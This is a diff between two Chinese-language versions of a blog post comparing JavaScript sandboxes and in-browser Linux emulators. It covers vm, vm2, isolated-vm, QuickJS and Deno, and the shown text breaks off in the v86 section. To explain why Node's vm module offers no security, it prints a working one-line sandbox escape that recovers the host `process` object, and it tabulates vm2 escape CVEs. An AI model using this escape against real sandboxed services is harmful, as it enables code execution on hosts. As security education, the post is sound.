@@ -1,58 +1,58 @@
 ---
-title: Linux 内核模拟的 JavaScript 方案横向对比
-description: 深入分析 JavaScript/TypeScript 中 Linux 环境模拟的各种实现。
+title: 每种 JavaScript 沙箱、模拟器、仿真器和 Linux 蜜罐，对比
+description: JavaScript/TypeScript 重建 Linux 环境方案的深入分析。
 date: 2026-05-28
-authors:
-  - fox3000foxy
 tags:
   - javascript
   - linux
   - analysis
+authors:
+  - fox3000foxy
 author_pubkey: "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEoFS9I15CAZojXYc6NMqggEYGct9o9b3JnWdXWOtlzgs2lclmqw8adtWgXUeeBMRHvm5LoajQ+OcImaAyA8jwYA=="
-author_sig: "vbc4NNX2gbI3qmMzjtmrYE3EnpGcvyWCShB3xK3vBCd97R/mQYB76BIjhgYX/sdTDfVh4Qc/hCus1Lgp5lOPwA=="
+author_sig: "JmBLgqcwwrnQMyxT4pTkQun2Tx0ZLHe5c6QK8IADBbXu/H5molHTbf4QQrMkIObSG31KhlOI1yaZEWyFNz3kVg=="
 ---
 
-# 所有 JavaScript 沙箱、模拟器、仿真器和蜜罐----横向对比
+# 每种 JavaScript 沙箱、模拟器、仿真器和 Linux 蜜罐，对比
 
-我在这条兔子洞里已经陷得太深太久了。起因是我在帮 [typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container) 这个项目----由 Fortune（后面会详细介绍她）开发的----然后不断有人问"等等，这个和 `v86` 有什么不同？"或"为什么不用 `vm2`？"----我意识到不先把整个生态系统的地图画清楚，我根本没法给出一个清晰的答案。所以现在就有了这篇文章，哈哈。
+好吧，我在这个兔子洞里已经走太远了。一切起因是我在帮 [typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)，Fortune 的项目（后面细说），老被问"等等，这和 `v86` 什么区别？"或"为什么不用 `vm2`？"，我发现不先把整个生态画出来，根本答不清楚。所以就有了这篇。坐长了，来杯咖啡，真的。或两杯。
 
-结果发现有四个不同的家族----JS 沙箱、Linux 仿真器、Linux 模拟器和蜜罐----虽然它们经常被放在一起谈论，但实际上几乎从不重叠。做插件系统的人会用 `isolated-vm`。做 CLI 工具演示的人会用 `v86`。做 SSH 威胁情报的人会用 Cowrie。虽然都在"把代码关在盒子里运行"这个模糊的大伞下，但他们在解决完全不同的问题。
+结果有四个完全不同的家族，JS 沙箱、Linux 模拟器、Linux 仿真器、蜜罐，几乎不重叠，虽然老被放一句话里。做插件系统的人用 `isolated-vm`。做 CLI 工具演示的人用 `v86`。做 SSH 威胁情报的人用 Cowrie。解决的问题完全不同，共用"把代码关进盒子跑"这顶大帽子。
 
-我花了很多时间阅读源代码、CVE 报告、架构文档和 npm 页面来写这篇文章。这篇文章会非常长----去冲杯咖啡吧，说真的。或者两杯。
+我为这篇读了大量源码、CVE 报告、架构文档、npm 页面。会很长，咖啡备好。真的。
 
-> 快速声明：`typescript-virtual-container` 在这篇文章中出现频率较高，因为正是它启发了这项研究。我尽量对其他项目保持公平，但请记住这个背景。
+> 小声明：`typescript-virtual-container` 在这篇戏份重，因为是它逼我做的调研。别的我尽量公允，但这层上下文先摆出来。
 
 ---
 
-## 第 0 部分----首先，你实际要解决的是什么问题？
+## 第 0 部分，先问你到底解决什么问题
 
-在深入之前，有必要先明确每个家族的用途，因为术语经常混用，人们也总弄混（包括我自己，在我坐下来真正理清之前）。
+开挖前先把每个家族管什么说清，术语很快变糊，大家老混着说（我画全图前也混）。
 
-**JS 沙箱**将 JavaScript 代码与宿主 Node.js 进程隔离开。威胁模型是：不可信的 JS 代码可能调用 `process.exit()`、读取文件或衍生子进程。解决方案是在 V8 执行周围设置一道边界。这些工具没有 Linux shell、带权限的文件系统或 SSH 的概念。
+**JS 沙箱**把 JavaScript 代码和宿主 Node.js 进程隔开。威胁模型是：不可信 JS 代码可能调 `process.exit()`、读文件、起子进程。解法是在 V8 执行周围画边界。这些东西没有 Linux shell、没有带权限的文件系统、没有 SSH 的概念。
 
-**Linux 仿真器**在 JavaScript 或 WebAssembly 实现的 CPU 仿真器（x86、RISC-V、OR1K）中运行一个真实的、未经修改的 Linux 内核。你启动一个真正的操作系统。获得真正的系统调用。获得与 x86 编译程序的二进制兼容性。开销巨大。
+**Linux 模拟器**在 JavaScript 或 WebAssembly 实现的 CPU 模拟器（x86、RISC-V、OR1K）里跑未经修改的真 Linux 内核。起真 OS。真系统调用。编译给 x86 的二进制兼容跑。资源代价巨大。
 
-**Linux 模拟器**模拟 Linux 系统的*行为*，但不运行真实内核。它们实现了一个 Shell 解释器、一个虚拟文件系统和足够的 Unix 语义来骗过程和用户。没有内核。没有 Wasm。没有 CPU 仿真。开销低得多。
+**Linux 仿真器**模仿 Linux 系统的*行为*，不跑真内核。实现 shell 解释器、虚拟文件系统、够骗过程序和人的 Unix 语义。无内核，无 Wasm，无 CPU 模拟。资源少得多。
 
-**蜜罐**旨在吸引攻击者并记录他们的行为。它们主要不是执行环境----而是可观测性工具。对真实 Linux 行为的保真度只要能防止攻击者发现陷阱就足够了。
+**蜜罐**为被攻击而生，记录攻击者干什么。主要不是执行环境，是观测工具。像不像真 Linux 只在"攻击者识不识破"这个意义上重要。
 
-带着这个框架，以下是本文中每个项目的位置：
+按这个框，这篇每个项目坐哪：
 
 ```
-JS 沙箱:        vm, vm2, isolated-vm, quickjs-emscripten, Deno Workers, ShadowRealm
-Linux 仿真器:   v86, JSLinux/TinyEMU, jor1k, CheerpX, WebContainers, container2wasm
-Linux 模拟器:   typescript-virtual-container (在此领域独树一帜)
-蜜罐:          Cowrie, Kippo, Lyrebird, endlessh, sshesame, node-simple-ssh-honeypot
-终端栈:        xterm.js + node-pty (不是隔离器，但密切相关)
+JS 沙箱：      vm, vm2, isolated-vm, quickjs-emscripten, Deno Workers, ShadowRealm
+Linux 模拟器：  v86, JSLinux/TinyEMU, jor1k, CheerpX, WebContainers, container2wasm
+Linux 仿真器：  typescript-virtual-container（这块独一家）
+蜜罐：         Cowrie, Kippo, Lyrebird, endlessh, sshesame, node-simple-ssh-honeypot
+终端栈：       xterm.js + node-pty（不是隔离器，但相关）
 ```
 
 ---
 
-## 第 1 部分----JavaScript 沙箱
+## 第 1 部分，JavaScript 沙箱
 
-### 1.1 `vm` ---- Node.js 内置模块（不是你想的那样）
+### 1.1 `vm`，Node.js 原生模块（和你想的不一样）
 
-Node 中最古老的"运行不可信 JS"的答案是内置的 `vm` 模块。它从 v0.1 就有了，所以很多人首先会使用它----然后被坑。
+Node 里"跑不可信 JS"最老的答案是原生 `vm` 模块。从 v0.1 就在，很多人第一个用它，然后被坑。
 
 ```js
 const vm = require("vm");
@@ -62,104 +62,104 @@ vm.runInContext("answer = 6 * 7", sandbox);
 console.log(sandbox.answer); // 42
 ```
 
-`vm` 实际做的事情：它创建一个新的 V8 上下文（一组全新的内置构造函数----`Object`、`Array`、`Function` 等）并在其中运行代码，与你在 `sandbox` 中放的对象共享引用。你的 V8 引擎不变。你的进程不变。内存是共享的。
+`vm` 真干的事：建新 V8 上下文（一套新原生构造器，`Object`、`Array`、`Function` 等），代码里面跑，共享你塞进 `sandbox` 的引用。V8 引擎没变。进程没变。内存共享。
 
-`vm` 提供不了安全性的原因：JavaScript 的原型链是一个有向无环图，所有东西都连接回 `Object.prototype`。如果你将宿主域中的任何对象放入沙箱，访客可以沿着它的原型链爬升到宿主构造函数。从 `Function` 出发，你可以调用 `Function("return process")()` 恢复出真正的 `process` 对象。游戏结束。立刻。
+`vm` 为什么零安全：JavaScript 原型链是 DAG 连着一切到 `Object.prototype`。宿主世界对象一进沙箱，客人顺原型链爬到宿主构造器。从 `Function` 出发，`Function("return process")()` 拿真 `process`。游戏结束。就地结束。
 
 ```js
-// 这段代码在 vm 中完美运行----你拿到了真正的 process 对象
+// vm 里这样完全跑得通，拿真 process
 vm.runInNewContext(`({}).__proto__.constructor("return process")()`);
 ```
 
-我是说，Node.js 文档自己都说："vm 模块不是安全机制。不要用它运行不可信代码。"这个警告一直都在。人们一直无视它。我见过生产环境的应用用 `vm` 做沙箱。拜托不要那样做 xD
+我说真的，Node.js 文档自己写："vm 模块不是安全机制。不要拿它跑不可信代码。"这警告一直都在。人们一直无视。我见过生产应用拿 `vm` 当沙箱。求你了别这么干。
 
-**结论**：作用域机制，不是沙箱。需要隔离变量作用域时使用（模板引擎、类似 `eval` 的功能且你能控制代码）。永远不要用于不可信输入。
+**结论**：作用域机制，不是沙箱。隔离变量用（模板引擎、`eval` 类功能但代码你可控）。不可信输入永远别用。
 
-**内存**：开销可忽略----与宿主进程共享同一 V8 堆。
-**安全性**：面对有动机的攻击者，毫无安全性。
+**内存**：可忽略开销，和宿主进程同一 V8 堆。
+**安全**：对有动机的攻击者零。
 
 ---
 
-### 1.2 `vm2` ---- 社区的尝试，及其漫长的死亡
+### 1.2 `vm2`，社区尝试，和它漫长的死亡
 
-`vm2` 是社区对 `vm` 逃逸问题的回答。核心思想是：用 `Proxy` 包裹每个穿越沙箱边界的对象，拦截属性访问，阻止原型链攀爬，过滤掉危险引用。理论上很聪明！实践中呢，我们来看看。
+`vm2` 是社区对 `vm` 逃逸的回答。核心思路：跨沙箱边界的每个对象包 `Proxy`，拦截属性访问，断原型链，过滤危险引用。思路聪明！实际结果嘛，如下所示，远没那么好看。
 
 ```js
 const { VM } = require("vm2");
 const vm = new VM({ timeout: 1000, sandbox: {} });
-vm.run("process.exit(1)"); // 抛出 VMError，process 不可访问
+vm.run("process.exit(1)"); // 抛 VMError，process 够不着
 ```
 
-几年内它运行得还不错。但 JavaScript `Proxy` 的攻击面巨大。每一个新的 JS 语言特性----生成器、异步迭代器、`Symbol.toPrimitive`、`Error.prepareStackTrace`、`Promise` 内部槽----都是潜在的绕过向量。
+好几年跑得不错。但 JavaScript `Proxy` 攻击面巨大。JS 语言每个新特性，生成器、异步迭代器、`Symbol.toPrimitive`、`Error.prepareStackTrace`、Promise 内部槽，都是潜在绕过向量。
 
-CVE 时间线……真的不一般。来看看：
+CVE 年表有点……你自己看：
 
-| 日期 | CVE | 机制 |
+| 日期 | CVE | 手法 |
 |------|-----|-----------|
-| 2022 年 10 月 | CVE-2022-36067 | `Error.prepareStackTrace` 宿主上下文逃逸 |
-| 2023 年 4 月 | CVE-2023-29017 | 未处理的异步错误栈宿主对象泄漏 |
-| 2023 年 4 月 | CVE-2023-29199 | 通过 `handleException()` 绕过异常清理 |
+| 2022 年 10 月 | CVE-2022-36067 | 经 `Error.prepareStackTrace` 逃宿主上下文 |
+| 2023 年 4 月 | CVE-2023-29017 | 未处理异步错误漏宿主对象 |
+| 2023 年 4 月 | CVE-2023-29199 | 经 `handleException()` 绕异常清洗 |
 | 2023 年 4 月 | CVE-2023-30547 | `Proxy.getPrototypeOf` → `Function` → RCE |
-| 2023 年 5 月 | CVE-2023-32314 | `Error.name` 上的 `Proxy` → `Function` → RCE |
-| 2023 年 7 月 | CVE-2023-37466 | 异步函数 + 栈溢出 + `Proxy.getPrototypeOf` |
-| 2023 年 7 月 | CVE-2023-37903 | 工作线程 + eval 逃逸 |
+| 2023 年 5 月 | CVE-2023-32314 | `Error.name` 上 `Proxy` → `Function` → RCE |
+| 2023 年 7 月 | CVE-2023-37466 | 异步函数加栈溢出加 `Proxy.getPrototypeOf` |
+| 2023 年 7 月 | CVE-2023-37903 | Worker 线程加 eval 逃逸 |
 
-同一个月（2023 年 4 月）出现了三个严重 CVE。一个月三个。在 CVE-2023-37903 之后，维护者正式废弃了该库，并附言：*"该库包含严重安全问题，不应用于生产环境。"*
+2023 年 4 月一个月三个严重 CVE。三！个！一！个！月！CVE-2023-37903 之后维护者正式弃坑，原话：*"库有严重安全问题，生产别用。"*
 
-维护者在 2025 年 10 月以 3.10.0 版本复活了它，声称修复了当时已知的所有问题。2026 年 1 月又披露了一个新的严重逃逸漏洞（CVE-2026-22709，CVSS 9.8），随后 2026 年 5 月又批发了 11 个。十一个。模式没有改变，说实话我觉得永远不会改变。
+维护者 2025 年 10 月带着 3.10.0 复活，称当时已知的全修了。2026 年 1 月披露新的严重逃逸（CVE-2026-22709，CVSS 9.8），2026 年 5 月又来一批十一个。十一个。模式没变，我觉得永远不会变。
 
-根本问题在于架构----这也是整个生态系统花了很长时间才吸取的教训。你不能用你正在沙箱化的同一种语言、在同一个引擎上、在同一个进程内构建一个安全的沙箱。逃逸面是整个 V8 实现----而 V8 是数百万行持续变化的 C++。每个新的 JS 特性都可能打开一条新的攻击路径。
+根本问题是架构性的，也是整个生态花一阵才学会的教训。同语言、同引擎、同进程里建的安全沙箱，盖不住。逃逸面是整个 V8 实现，几百万行 C++，天天变。JS 每个新特性都可能开新攻击路。
 
-**结论**：不要用于安全敏感的应用。即使在最新版本上，每几个月就会发现新的绕过方式。维护者本人也公开承认了这一点。
+**结论**：安全敏感别用。最新版也一样，绕过几个月出一个。维护者自己都公开认了。
 
 ---
 
-### 1.3 `isolated-vm` ---- 真正有效的那一个
+### 1.3 `isolated-vm`，真管用的那个
 
-`isolated-vm` 采用了正确的方法：使用 V8 自身的隔离原语----Isolate。每个 V8 Isolate 有自己的堆、自己的垃圾回收器、自己的一组内置对象，并且与其他 Isolate 零共享引用。
+`isolated-vm` 路子对：用 V8 原生隔离原语 Isolate。每个 V8 Isolate 独立堆、独立 GC、独立原生件、和其他 Isolate 零共享引用。
 
-这与 Chrome 在标签页之间使用的边界相同。它是真正的安全边界，而不是基于 Proxy 的语言级技巧。
+Chrome 标签页之间就是这条边界。真安全屏障，不是语言层 Proxy 小把戏。
 
 ```js
 import ivm from "isolated-vm";
 
-// 每个 isolate 是自己的 V8 堆
-const isolate = new ivm.Isolate({ memoryLimit: 64 }); // MB 上限
+// 每个 isolate 是独立 V8 堆
+const isolate = new ivm.Isolate({ memoryLimit: 64 }); // 上限 MB
 const context = await isolate.createContext();
 const jail = context.global;
 
-// 跨边界传递数据需要显式序列化
+// 过边界数据显式序列化
 await jail.set("sensitiveData", "not this");
 await jail.set("log", new ivm.Reference(console.log));
 
 const script = await isolate.compileScript(`
-  // 无法访问宿主进程、宿主堆或宿主模块
+  // 够不着宿主进程、宿主堆、宿主模块
   log.applySync(undefined, ["hello from the isolate"]);
 `);
 await script.run(context);
 
-// 可以在超时或达到内存限制时强制终止
-isolate.dispose(); // 释放整个堆
+// 超时或超内存硬杀
+isolate.dispose(); // 整堆释放
 ```
 
-`Reference` 和 `ExternalCopy` 类型是显式的通信桥梁。`Reference` 给 isolate 一个宿主函数的可调用句柄----isolate 可以调用它但无法检查其闭包或原型。`ExternalCopy` 将值序列化（结构化克隆）穿过堆边界。这种显式桥梁模式不方便，但这正是隔离真实的原因。
+`Reference` 和 `ExternalCopy` 类型是显式通信桥。`Reference` 给 isolate 可调用宿主函数的 handle，isolate 能调不能看它闭包或原型。`ExternalCopy` 跨堆边界序列化值（结构化克隆）。显式桥不好用，但是隔离真的原因。
 
-你可以设置硬性资源限制：内存（isolate 超出上限会被终止）、挂墙时钟超时和 CPU 超时。终止是真实的----它杀死整个 V8 Isolate，而不仅仅是一个可能被 `while(true)` 绕过的 JS 超时。
+资源上限能收紧：内存（超了杀 isolate）、墙钟超时、CPU 超时。杀是真杀，杀整个 V8 Isolate，不是可以 `while(true)` 绕的 JS 超时。
 
-**局限性**：仅限于 JS。你不能在里面运行 bash。没有文件、权限、网络或进程的概念。对于用户提交的 JS（插件、公式、脚本钩子）来说，这是正确的工具，对其他所有事情都是错误的工具。`typescript-virtual-container` 的作者提到她早期考虑过它，后来才意识到"运行 Shell 命令"和"隔离 JavaScript"是根本不同的问题。
+**局限**：只管 JS。里面跑不了 bash。没有文件、权限、网络、进程概念。用户提交 JS（插件、公式、脚本钩子）完美，别的一概不行。`typescript-virtual-container` 作者说当初考虑过，才发现"隔离 JavaScript"和"跑 shell 命令"是根本不同的两个问题。
 
-**内存**：每个空 Isolate ~3–10 MB，随堆使用增长。
-**安全性**：强。V8 Isolate 边界是真正的隔离原语。
+**内存**：空 isolate 约 3-10M，随堆用涨。
+**安全**：稳。V8 Isolate 边界是真隔离原语。
 **npm**：[isolated-vm](https://www.npmjs.com/package/isolated-vm)
 **GitHub**：[laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)
 
 ---
 
-### 1.4 `quickjs-emscripten` ---- 编译到 Wasm 的独立 JS 引擎
+### 1.4 `quickjs-emscripten`，Wasm 里跑另一个 JS 引擎
 
-一种不同的方法：不依赖 V8 内部隔离，而是在完全独立的 JavaScript 引擎中运行，该引擎编译为 WebAssembly。宿主演 V8/Node。访客运行在 QuickJS 内部（QuickJS 在 Wasm 内部）。Wasm 沙箱提供隔离边界。
+换思路：不在 V8 里隔离，跑 Wasm 编译的完全独立 JS 引擎。宿主跑 V8/Node。客人跑 Wasm 里的 QuickJS。Wasm 沙箱给隔离边界。
 
-QuickJS 又是 Fabrice Bellard 的作品（就是那个做了 QEMU、FFmpeg、JSLinux、TinyEMU 的人----这家伙真的不是真人，一个人怎么可能做这么多事情）。它是一个小型、符合规范的 ES2023 JS 引擎，用 C 编写，编译为 Wasm 后只有约 500 KB。
+QuickJS 还是 Fabrice Bellard 的作品（QEMU、FFmpeg、JSLinux、TinyEMU 全他写的，这人不是真的吧，一个人怎么干这么多）。小 ES2023 合规 JS 引擎，C 写的，编进 Wasm 约 500K。
 
 ```js
 import { getQuickJS } from "quickjs-emscripten";
@@ -168,7 +168,7 @@ const QuickJS = await getQuickJS();
 const vm = QuickJS.newContext();
 
 const result = vm.evalCode(`
-  // 在 QuickJS 中运行，完全独立于 V8
+  // 跑在 QuickJS，和 V8 完全隔离
   (function() { return 6 * 7; })()
 `);
 
@@ -183,9 +183,9 @@ if (result.error) {
 vm.dispose();
 ```
 
-QuickJS 是一个符合规范的小型 ES2023 JavaScript 引擎，用 C 编写。编译为 Wasm 后，同步变体约 500 KB，异步（Asyncify）变体约 1 MB。内存管理是手动的----从 VM 中提取的每个值都需要显式释放，这有点烦人，但避免了跨边界 GC 意外。有趣的权衡！
+QuickJS 是 ES2023 合规小 JS 引擎，C 写的。编 Wasm 同步版约 500K，异步版（Asyncify）约 1M。内存管理手动，从 VM 拿的每个值显式释放，有点烦但杜绝跨边界 GC 惊喜。trade-off 挺逗！
 
-`@sebastianwessel/quickjs` 包装器在之上添加了更友好的 API，带有可选的虚拟文件系统、fetch 支持和 Node.js 模块存根：
+`@sebastianwessel/quickjs` wrapper 在上面包了更顺手的 API，可选虚拟文件系统、fetch、Node.js 模块 stub：
 
 ```ts
 import variant from "@jitl/quickjs-ng-wasmfile-release-sync";
@@ -202,58 +202,58 @@ const result = await runSandboxed(
 );
 ```
 
-安全模型与 `isolated-vm` 不同：Wasm 的线性内存模型意味着访客无法直接访问 V8 堆对象。攻击面是宿主↔Wasm 接口（导入/导出），而不是整个 JS 语言。这通常被认为比基于 Proxy 的沙箱更稳健。
+安全模型和 `isolated-vm` 不同：Wasm 线性内存模型让客人直接够不着宿主 V8 堆对象。攻击面是宿主↔Wasm 接口（导入导出），不是整个 JS 语言。一般认为比 Proxy 沙箱稳。
 
-缺点是：QuickJS 没有 V8 那样的优化水平。对于 CPU 密集型的 JS 工作负载，它比 V8 慢 5–20 倍。对于短代码片段和不可信的 eval，这通常不是问题。
+代价：QuickJS 优化比 V8 差远。JS 纯 CPU 活慢 5 到 20 倍。小代码和不可信求值一般无所谓。
 
-**内存**：每个实例约 500 KB Wasm 模块 + 堆。
-**安全性**：Wasm 边界，被认为比基于 Proxy 的方法更强。
+**内存**：Wasm 模块约 500K 加每实例堆。
+**安全**：Wasm 边界，一般认为比 Proxy 强。
 **npm**：[quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten)、[@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs)
 **GitHub**：[justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)
 
 ---
 
-### 1.5 Deno ---- 权限优先的运行时
+### 1.5 Deno，权限优先的运行时
 
-Deno 采取了完全不同的理念：不在 Node 内部做沙箱，而是构建一个默认安全的全新运行时。我真的很喜欢这个思路----说实话，Node.js 从一开始就应该这样。Ryan Dahl（原 Node.js 创建者）做 Deno 的原因之一就是后悔 Node.js 的一些设计决定，想想还挺疯狂的。
+Deno 哲学完全不同：不在 Node 里做沙箱，造默认安全的新运行时。我真喜欢这思路，这才是 Node.js 当初该有的样子，真的。Ryan Dahl（Node.js 原作者）字面因为后悔 Node.js 几个设计决定造了 Deno，想想多疯。
 
-每个敏感能力（文件读、文件写、网络、环境变量、子进程）都需要显式的 `--allow-*` 标志：
+每个敏感能力（读文件、写文件、网络、环境、子进程）要显式 `--allow-*` flag：
 
 ```bash
-# 只能从 /data 读取，其他什么都不能做
+# 只能读 /data，别的不行
 deno run --allow-read=/data script.ts
 
-# 只能获取一个域名
+# 只能访问一个域名
 deno run --allow-net=api.example.com script.ts
 
-# 没有标志 = 没有任何权限
-deno run untrusted.ts # 不能读、写、联网、派生进程
+# 没 flag 就没权限
+deno run untrusted.ts # 不能读、不能写、不能网、不能起
 ```
 
-权限模型在 Rust/OS 级别实现----它不是 JS 技巧。当 Deno 代码调用 `Deno.readFile()` 时，它会经过一个 Rust 操作，在接触文件系统之前检查权限表。你无法从 JS 绕过它，因为如果没有被授予权限，系统调用根本不会发生。
+权限模型实现在 Rust/OS 层，不是 JS 小把戏。Deno 代码调 `Deno.readFile()`，过 Rust 操作先查权限表再碰文件系统。JS 层绕不过，因为没权限系统调用根本不发生。
 
-对于运行真正不可信的代码，Deno Workers（Web Workers）在同一进程中提供了第二个 isolate，每个都有自己的一套权限。你可以生成一个零权限的 worker，并通过 `postMessage` 与之通信。
+跑真不可信代码，Deno Worker（Web Worker）给同进程第二个 isolate，各带权限集。零权限 worker 起一个，`postMessage` 通信。
 
-Deno 2（2024 年 10 月发布）增加了完整的 npm 兼容性和 Node.js 兼容性填充，显著提高了其在服务端用例中的采用率。
+Deno 2（2024 年 10 月）加完整 npm 兼容和 Node.js 兼容垫片，服务端采用多多了。
 
-**权衡**：Deno 的安全模型非常适合你可能部分信任的代码。对于可能是敌对性的完全不可信代码，权限模型帮不了你----你需要一个 Isolate 边界（`isolated-vm`）或不同的引擎（`quickjs-emscripten`），因为 Deno 仍然运行 V8，老练的攻击者可以找到 V8 级别的漏洞。
+**trade-off**：Deno 安全模型对"半信"代码极好。对完全不可信、可能怀恶意的代码，权限模型不够，要 Isolate 边界（`isolated-vm`）或换引擎（`quickjs-emscripten`），因为 Deno 还是 V8， sophistication 攻击者能找 V8 层 bug。
 
 ---
 
-### 1.6 TC39 ShadowRealm ---- 标准答案（终有一天）
+### 1.6 TC39 ShadowRealm，标准答案（以后）
 
-JavaScript 标准机构（TC39）有一个名为 ShadowRealm 的提案，试图标准化 `vm` 和 `vm2` 试图做的事情，但采用正确的安全模型。ShadowRealm 创建一个隔离的 JS 执行上下文，拥有自己的一套内置对象，无法访问外部域，并通过一个精心控制的导入/导出接口进行通信。
+JS 标准组织（TC39）有个 ShadowRealm 提案，想把 `vm` 和 `vm2` 要干的事标准化，但安全模型做对。ShadowRealm 建隔离 JS 执行上下文，自带内建件，够不着外部 realm，导入导出接口严格管。
 
 ```js
 const realm = new ShadowRealm();
 const result = realm.evaluate(`
-  // 独立的内置对象，无法访问外部域
+  // 独立内建件，够不着外部 realm
   typeof globalThis.fetch // "undefined"
   6 * 7 // 42
 `);
 ```
 
-ShadowRealm 已在浏览器中可用（Chrome 90+、Firefox 105+），但截至 2026 年尚未在 Node.js 稳定版中实现。TC39 Compartments 提案在此基础上构建，用于模块级隔离。这些是长期的标准化答案，但在服务端 Node 用例中尚未达到生产就绪状态。就像那些你早就知道要来，但就是……还没来的东西。典型的 TC39 xD
+ShadowRealm 浏览器有了（Chrome 90+、Firefox 105+），2026 年 Node.js 稳定版还没有。TC39 Compartments 提案在上面做模块级隔离。长期标准答案，但服务端生产还没到。看得见来，但……就是还没到。经典 TC39。
 
 ---
 
@@ -261,38 +261,37 @@ ShadowRealm 已在浏览器中可用（Chrome 90+、Firefox 105+），但截至 
 
 | | `vm` | `vm2` | `isolated-vm` | `quickjs-emscripten` | Deno Workers |
 |---|---|---|---|---|---|
-| **隔离边界** | 无（仅限作用域） | Proxy（已被攻破） | V8 Isolate | Wasm | V8 Isolate + Rust 权限 |
-| **内存上限** | ❌ | ❌ | ✅ 硬限制 | ✅ Wasm 堆 | 部分 |
-| **CPU 超时** | ❌ | ✅（可绕过） | ✅ 硬限制 | ✅ | ✅ |
-| **安全性** | 无 | 已攻破 | 强 | 强 | 强 |
-| **JS 速度** | 原生 V8 | 原生 V8 | 原生 V8 | ~慢 10 倍 | 原生 V8 |
+| **隔离边界** | 无（作用域） | Proxy（破了） | V8 Isolate | Wasm | V8 Isolate 加 Rust 权限 |
+| **内存上限** | ❌ | ❌ | ✅ 硬上限 | ✅ Wasm 堆 | 部分 |
+| **CPU 超时** | ❌ | ✅（可绕） | ✅ 硬 | ✅ | ✅ |
+| **安全** | 无 | 破 | 稳 | 稳 | 稳 |
+| **JS 速度** | V8 原生 | V8 原生 | V8 原生 | 约慢 10 倍 | V8 原生 |
 | **浏览器** | ❌ | ❌ | ❌ | ✅ | ❌ |
-| **Node 兼容** | 原生 | ✅ | ✅ | 部分填充 | 部分 |
-| **状态** | 稳定 | 危险（新 CVE） | ✅ 活跃 | ✅ 活跃 | ✅ 活跃 |
-| **RAM 开销** | ~1 MB | ~5–20 MB | ~3–10 MB | ~5–15 MB | ~10–30 MB |
+| **Node 兼容** | 原生 | ✅ | ✅ | 部分垫片 | 部分 |
+| **状态** | 稳定 | 危险（新 CVE 不断） | ✅ 活跃 | ✅ 活跃 | ✅ 活跃 |
+| **内存开销** | 约 1M | 约 5-20M | 约 3-10M | 约 5-15M | 约 10-30M |
 
-要点：如果你关心安全性，只有两个真正的选择----`isolated-vm`（原生插件、V8 Isolate、全速 JS）和 `quickjs-emscripten`（Wasm、浏览器兼容、计算密集型代码慢约 10 倍）。其他要么是"求你了别用"（`vm`、`vm2`），要么是一个解决完全不同问题的运行时（Deno）。ShadowRealm 最终可能会改变这个格局，但现在还没到。
-
+结论：安全要紧，真选项只有两个，`isolated-vm`（原生扩展，V8 Isolate，全速 JS）和 `quickjs-emscripten`（Wasm，兼容浏览器，重算慢约 10 倍）。剩下要么"求你别"（`vm`、`vm2`），要么解决完全别的问题的运行时（Deno）。ShadowRealm 以后可能改命，但不是现在。
 ---
 
-## 第 2 部分----JavaScript 中的 Linux 仿真器
+## 第 2 部分，JavaScript 里的 Linux 模拟器
 
-这才是真正让我感兴趣的地方。这些是*真正*的仿真器----它们在 JavaScript 或 WebAssembly 中实现 CPU 指令集、启动真正的 Linux 内核镜像、运行真正的用户态二进制文件。隔离来自于访客和宿主不共享任何东西：不同的内存空间、不同的指令流。
+这里开始对我是真有意思的部分。全是*真*模拟器，在 JavaScript 或 WebAssembly 实现的 CPU 指令集里起真 Linux 内核镜像，跑真用户态二进制。隔离来自客人宿主零共享：不同内存空间，不同指令流。
 
-你付出的代价是巨大的，但你得到的东西着实令人惊叹：真正的 Linux，真正在运行，在你的浏览器或 Node.js 进程中。想想就觉得挺疯狂的，对吧？
+代价巨大，得到的东西也真离谱：真 Linux，真跑，在你浏览器或 Node 进程里。想想多疯，对吧？
 
-### 2.1 `v86` ---- JS + Wasm JIT 中的 x86 PC 仿真器
+### 2.1 `v86`，JS 加 Wasm JIT 的 x86 PC 模拟器
 
-Fabrice（GitHub 用户名 copy）的 `v86` 是 JavaScript 中功能最强大的开源 x86 仿真器。它始于 2013 年左右的纯 JS 解释器，后来演变为一个 JIT 编译系统----x86 基本块被动态翻译为 WebAssembly，大幅提升了性能。
+`v86` 是 copy（GitHub 上）在 JavaScript 里最能打的开源 x86 模拟器。2013 年左右纯 JS 解释器起家，进化到 x86 基本块 JIT 翻 WebAssembly，性能涨一大截。
 
-它仿真了以下内容：
-- **CPU**：x86-32（IA-32），指令集大致相当于 Pentium 1 级别。不支持 64 位（x86-64）----这是硬架构限制，不是缺少功能。
-- **FPU**：通过 JavaScript 的 `Float64Array` 实现。x87 是 80 位扩展精度；JS 双精度浮点是 64 位。这意味着浮点结果可能与真实 CPU 略有不同。
-- **内存**：可配置，映射到 JS 堆中的 `SharedArrayBuffer` 或 `ArrayBuffer`。
-- **硬件**：8254 PIT（定时器）、8259 PIC（中断控制器）、8042 键盘控制器（PS/2）、CMOS RTC、带 SVGA 扩展和 Bochs VBE 的 VGA、IDE 控制器、软盘控制器（8272A）、NE2000 网卡。
-- **BIOS**：使用 SeaBIOS（开源 x86 BIOS）。
+模拟什么：
+- **CPU**：x86-32（IA-32），指令集约 Pentium 1 水平。64 位（x86-64）没有，这是硬件架构限制，不是缺功能。
+- **FPU**：走 JavaScript `Float64Array`。x87 是 80 位扩展精度，JS double 64 位。浮点结果和真 CPU 差一点。
+- **内存**：可配，映射到 JS 堆 `SharedArrayBuffer` 或 `ArrayBuffer`。
+- **硬件**：8254 PIT（定时）、8259 PIC（中断控制）、8042 键盘控制（PS/2）、CMOS RTC、VGA 加 SVGA 和 Bochs VBE 扩展、IDE 控制、软盘控制（8272A）、NE2000 网卡。
+- **BIOS**：SeaBIOS（开源 x86 BIOS）。
 
-JIT 的工作原理是识别基本块（没有跳转的 x86 指令序列），将其翻译为 WebAssembly 函数，缓存该函数，并在同一块后续执行时调用。热代码路径获得原生 Wasm 性能。冷路径回退到 JS 解释器。
+JIT 干活：识别基本块（无跳转指令序列），翻成 WebAssembly 函数，缓存，下次跑同块直接调。热路径跑原生 Wasm 性能。冷路径回 JS 解释器。
 
 ```js
 import { V86 } from "v86";
@@ -302,104 +301,104 @@ const emulator = new V86({
   bios:    { buffer: readFileSync("./bios/seabios.bin") },
